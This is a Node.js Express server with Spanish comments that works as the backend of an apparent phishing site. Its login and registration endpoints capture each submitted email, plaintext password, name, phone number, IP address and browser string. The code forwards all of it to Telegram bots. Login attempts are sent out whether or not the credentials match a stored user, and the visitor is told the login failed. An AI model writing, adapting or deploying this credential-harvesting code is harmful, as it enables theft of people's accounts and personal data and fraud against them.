// server.js
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Base de datos simple en memoria para usuarios registrados
const users = [];

// Función para enviar mensaje a Telegram - LOGIN
async function sendToTelegram(email, password, userAgent, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error('Telegram bot no configurado');
  }

  const timestamp = new Date().toLocaleString('es-CO', { 
    timeZone: 'America/Bogota',
    dateStyle: 'full',
    timeStyle: 'long'
  });
  
  const message = `
🚨 NUEVO INTENTO DE LOGIN 🚨

📧 Correo: ${email}
🔑 Contraseña: ${password}

⏰ Fecha/Hora: ${timestamp}
🌐 Navegador: ${userAgent}
📍 IP: ${ip}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    const result = await response.json();
    
    if (!result.ok) {
      console.error('Error de Telegram API:', result);
      throw new Error(result.description || 'Error al enviar mensaje');
    }
    
    return true;
  } catch (error) {
    console.error('Error al enviar a Telegram:', error);
    throw error;
  }
}

// Función para enviar mensaje a Telegram - REGISTRO
async function sendRegistroToTelegram(userData, userAgent, ip) {
  const TELEGRAM_BOT_TOKEN_REGISTRO = process.env.TELEGRAM_BOT_TOKEN_REGISTRO;
  const TELEGRAM_CHAT_ID_REGISTRO = process.env.TELEGRAM_CHAT_ID_REGISTRO;

  if (!TELEGRAM_BOT_TOKEN_REGISTRO || !TELEGRAM_CHAT_ID_REGISTRO) {
    throw new Error('Telegram bot de registro no configurado');
  }

  const timestamp = new Date().toLocaleString('es-CO', { 
    timeZone: 'America/Bogota',
    dateStyle: 'full',
    timeStyle: 'long'
  });
  
  const message = `
🆕 NUEVO REGISTRO 🆕

👤 Nombre: ${userData.firstName} ${userData.lastName}
📧 Correo: ${userData.email}
🔑 Contraseña: ${userData.password}
📱 Teléfono: ${userData.phoneCode} ${userData.phone}
🎫 Código de Registro: ${userData.registrationCode}

⏰ Fecha/Hora: ${timestamp}
🌐 Navegador: ${userAgent}
📍 IP: ${ip}
🆔 ID Usuario: ${userData.id}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_REGISTRO}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_REGISTRO,
        text: message
      })
    });

    const result = await response.json();
    
    if (!result.ok) {
      console.error('Error de Telegram API:', result);
      throw new Error(result.description || 'Error al enviar mensaje');
    }
    
    return true;
  } catch (error) {
    console.error('Error al enviar a Telegram:', error);
    throw error;
  }
}

// Endpoint para recibir REGISTRO
app.post('/api/register', async (req, res) => {
  try {
    const { 
      registrationCode,
      firstName, 
      lastName, 
      email, 
      password, 
      phoneCode, 
      phone 
    } = req.body;

    const userAgent = req.headers['user-agent'];
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Validar datos
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email y contraseña son requeridos' 
      });
    }

    // Verificar si el usuario ya existe
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
      return res.status(400).json({ 
        success: false, 
        message: 'Este email ya está registrado' 
      });
    }

    console.log(`📥 Registro recibido: ${email}`);

    // Crear nuevo usuario
    const newUser = {
      id: users.length + 1,
      registrationCode: registrationCode || 'Sin código',
      firstName: firstName || 'N/A',
      lastName: lastName || 'N/A',
      email,
      password,
      phoneCode: phoneCode || 'N/A',
      phone: phone || 'N/A',
      registeredAt: new Date().toISOString()
    };

    // Guardar en la base de datos
    users.push(newUser);

    // Enviar a Telegram
    await sendRegistroToTelegram(newUser, userAgent, ip);

    console.log(`✅ Registro enviado a Telegram para: ${email}`);

    // Responder al cliente
    res.json({ 
      success: true, 
      message: 'Registro exitoso',
      userId: newUser.id
    });

  } catch (error) {
    console.error('❌ Error en /api/register:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error al procesar registro' 
    });
  }
});

// Endpoint para recibir LOGIN
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const userAgent = req.headers['user-agent'];
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Validar datos
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email y contraseña son requeridos' 
      });
    }

    console.log(`📥 Intento de login recibido: ${email}`);

    // Buscar usuario en la base de datos
    const user = users.find(u => u.email === email && u.password === password);

    if (!user) {
      // Usuario no existe o contraseña incorrecta
      await sendToTelegram(email, password, userAgent, ip);
      console.log(`✅ Intento de login (sin registro) enviado a Telegram: ${email}`);
      
      return res.status(401).json({ 
        success: false, 
        message: 'Email o contraseña incorrectos' 
      });
    }

    // Usuario existe y contraseña correcta - enviar login exitoso
    await sendToTelegram(email, password, userAgent, ip);
    console.log(`✅ Login exitoso enviado a Telegram para: ${email}`);

    // Responder al cliente
    res.json({ 
      success: true, 
      message: 'Login procesado correctamente',
      user: {
        id: user.id,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email
      }
    });

  } catch (error) {
    console.error('❌ Error en /api/login:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error al procesar login' 
    });
  }
});

// Endpoint de prueba
app.get('/api/test', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Servidor funcionando correctamente',
    telegram_login_configured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
    telegram_registro_configured: !!(process.env.TELEGRAM_BOT_TOKEN_REGISTRO && process.env.TELEGRAM_CHAT_ID_REGISTRO),
    total_users: users.length
  });
});

// Endpoint para ver usuarios registrados (opcional - para desarrollo)
app.get('/api/users', (req, res) => {
  res.json({ 
    total: users.length,
    users: users.map(u => ({
      id: u.id,
      name: `${u.firstName} ${u.lastName}`,
      email: u.email,
      phone: `${u.phoneCode} ${u.phone}`,
      registrationCode: u.registrationCode,
      registeredAt: u.registeredAt
    }))
  });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════╗
║   🚀 Servidor iniciado correctamente     ║
║   📡 Puerto: ${PORT}                        ║
║   🤖 Bot LOGIN: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configurado' : '❌ No configurado'}      ║
║   🤖 Bot REGISTRO: ${process.env.TELEGRAM_BOT_TOKEN_REGISTRO ? '✅ Configurado' : '❌ No configurado'}   ║
║   👥 Usuarios: ${users.length}                          ║
╚═══════════════════════════════════════════╝
  `);
});
